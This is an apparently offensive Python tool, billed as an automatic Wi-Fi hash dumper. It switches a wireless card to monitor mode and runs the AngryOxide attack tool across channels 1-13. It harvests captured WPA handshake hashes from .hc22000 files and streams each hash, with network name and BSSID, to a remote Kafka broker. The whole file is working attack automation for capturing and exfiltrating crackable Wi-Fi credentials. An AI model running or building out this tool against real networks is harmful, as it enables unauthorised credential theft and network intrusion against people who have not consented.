import subprocess
import time
import sys
import csv
import pandas as pd
import re
import os
import json
import argparse
from kafka import KafkaProducer

# ======================
# Global Configurations
# ======================

sysId = 'Attack1'
MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
KAFKA_BROKER = 'localhost:9092'  # Default Kafka broker

DESC_MESSAGE = \
  r">>============================================<<" + "\n"\
+ r"||     _    ___               ___     ______  ||"  + "\n"\
+ r"||    / \  / _ \             / \ \   / / ___| ||"  + "\n"\
+ r"||   / _ \| | | |  _____    / _ \ \ / / |     ||"  + " by dr0pp1n\n"\
+ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.6a\n"\
+ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 251201\n"\
+ r"||                                            ||"  + "\n"\
+ r">>============================================<<"  + "\n"

WELCOME_MESSAGE = DESC_MESSAGE \
+ "[*] AngryOxide-AVClub Automatic Wi-Fi Hashdumper starting up...\n"\
+ "[!] Select an interface to convert to monitor mode.\n"\
+ "[!] Send SIGINT (Ctrl-C) to exit.\n"

# ======================
# Helper Functions
# ======================

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description=DESC_MESSAGE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 AVC.py
  python3 AVC.py -b 192.168.1.100:9092
  python3 AVC.py --interval 10
  python3 AVC.py -b 192.168.1.100:9092 -i 10
  python3 AVC.py -h
        '''
    )
    parser.add_argument('-b', '--broker', type=str, default=KAFKA_BROKER, 
                        help=f'Kafka broker address (ip:port), default: {KAFKA_BROKER}')
    parser.add_argument('-i', '--interval', type=int, default=MODULE_INTERVAL,
                        help=f'Scan interval in seconds, default: {MODULE_INTERVAL}')
    return parser.parse_args()

def list_wireless_interfaces():
    """List available wireless interfaces on the system."""
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces
    except Exception as e:
        print(f"[!] Error listing interfaces: {e}")
        return []

def select_interface():
    """Prompt user to select a wireless interface."""
    interfaces = list_wireless_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        sys.exit(1)
    
    print("\n[*] Available wireless interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {i}. {iface}")
    
    while True:
        try:
            choice = int(input("\n[*] Select interface (number): "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print("[!] Invalid selection. Try again.")
        except ValueError:
            print("[!] Invalid input. Enter a number.")

def enable_monitor_mode(interface):
    """Enable monitor mode on the selected interface."""
    try:
        print(f"\n[*] Enabling monitor mode on {interface}...")
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'none'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[+] Monitor mode enabled on {interface}")
        return True
    except Exception as e:
        print(f"[!] Error enabling monitor mode: {e}")
        return False

def open_csv(file_path):
    """Opens a CSV file and returns its contents as a list of lists."""
    with open(file_path, 'r') as file:
        reader = csv.reader(file)
        data = list(reader)
    return data

def is_blank_row(row):
    if row is None:
        return True
    if not isinstance(row, (list, tuple)):
        return False
    for cell in row:
        if isinstance(cell, str):
            if cell.strip() != '':
                return False
        elif cell is not None:
            return False
    return True

def list_to_df(data):
    """Converts a list of lists into a pandas DataFrame."""
    clean = [row for row in data if not is_blank_row(row)]
    if not clean:
        return pd.DataFrame()
    headers = clean[0]
    rows = clean[1:]
    df = pd.DataFrame(rows, columns=headers)
    return df

def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
    """
    Split a DataFrame into two parts where a row indicates the start of a new table.
    Returns (top_df, bottom_df). If marker not found, returns (df, empty_df).
    """
    if df is None or df.empty:
        return df, pd.DataFrame()

    mask = pd.Series(False, index=df.index)

    if col_index is not None:
        try:
            col = df.iloc[:, col_index].astype(str).str.strip()
            mask = col.eq(marker) | col.str.contains(re.escape(marker), case=False, na=False)
        except Exception:
            mask = pd.Series(False, index=df.index)

    if not mask.any():
        try:
            mask = df.astype(str).apply(lambda c: c.str.strip().str.contains(re.escape(marker), case=False, na=False)).any(axis=1)
        except Exception:
            mask = pd.Series(False, index=df.index)

    if not mask.any():
        return df, pd.DataFrame()

    match_idx = mask[mask].index[0]
    pos = df.index.get_loc(match_idx)
    header_row = df.iloc[pos].tolist()
    top_df = df.iloc[:pos].reset_index(drop=True)
    bottom_df = df.iloc[pos+1:].reset_index(drop=True)

    if not bottom_df.empty:
        if len(header_row) != bottom_df.shape[1]:
            if len(header_row) < bottom_df.shape[1]:
                header_row = header_row + [f'col{i}' for i in range(len(header_row), bottom_df.shape[1])]
            else:
                header_row = header_row[:bottom_df.shape[1]]
        bottom_df.columns = [str(h).strip() for h in header_row]

    return top_df, bottom_df

def publish_to_kafka(topic, message, broker='localhost:9092'):
    """Publish a message to a Kafka topic and print to terminal."""
    try:
        producer = KafkaProducer(
            bootstrap_servers=[broker],
            value_serializer=lambda v: json.dumps(v).encode('utf-8')
        )
        producer.send(topic, value=message)
        producer.flush()
        print(f"[+] Published to Kafka topic '{topic}': {message}")
        producer.close()
    except Exception as e:
        print(f"[!] Error publishing to Kafka: {e}")

# ======================
# Main Function
# ======================
def main(interval, broker):
    print("[*] Cleaning up...")
    subprocess.run(["./cleanup.sh"])

    # Select and enable monitor mode
    selected_interface = select_interface()
    if not enable_monitor_mode(selected_interface):
        print("[!] Failed to enable monitor mode. Exiting.")
        sys.exit(1)

    print("[*] Starting attack modules...")
    # Start AngryOxide subprocess
    print(f"[*] Starting AngryOxide on {selected_interface}...")
    angryoxide = subprocess.Popen(['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-w', 'whitelist.txt', '-r', '3', '--headless', '--notar'],
                                  stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
    print(f"[*] Scan interval: {interval} seconds")
    print(f"[*] Kafka broker: {broker}")

    processed_files = set()

    # Main loop
    while True:
        try:
            time.sleep(interval)
            
            # Find all .hc22000 files in current directory
            hc_files = [f for f in os.listdir('.') if f.endswith('.hc22000')]
            
            for hc_file in hc_files:
                if hc_file not in processed_files:
                    print(f"[*] Found new hash file: {hc_file}")
                    try:
                        # Extract essid and bssid from filename
                        # Format: essid_BSSID.hc22000
                        # Remove .hc22000 extension and BSSID (8 chars including underscore)
                        name_without_ext = hc_file[:-8]
                        # Split on last underscore to separate essid and bssid
                        parts = name_without_ext.rsplit('_', 1)
                        if len(parts) == 2:
                            essid = parts[0]
                            bssid = parts[1]
                        else:
                            essid = name_without_ext
                            bssid = 'unknown'
                        
                        with open(hc_file, 'r') as f:
                            for line in f:
                                line = line.strip()
                                if line:
                                    message = {
                                        'sysId': sysId,
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                                        'essid': essid,
                                        'bssid': bssid,
                                        'hash': line
                                    }
                                    print(f"[+] Read hash from {essid} ({bssid}): {line}")
                                    publish_to_kafka('wifi-hash', message, broker=broker)
                        processed_files.add(hc_file)
                    except Exception as e:
                        print(f"[!] Error reading {hc_file}: {e}")

        except KeyboardInterrupt:
            print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
            print("[*] Terminating subprocesses...")
            if angryoxide:
                angryoxide.terminate()
            break
        except Exception as e:
            print(f"[!] Exception occurred: {e}")

# ======================
# Main Loop (calls main)
# ======================

if __name__ == "__main__":
    try:
        args = parse_arguments()
        print(WELCOME_MESSAGE)
        main(interval=args.interval, broker=args.broker)
    except KeyboardInterrupt:
        print("\n[!] SIGINT detected (Ctrl-C), exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
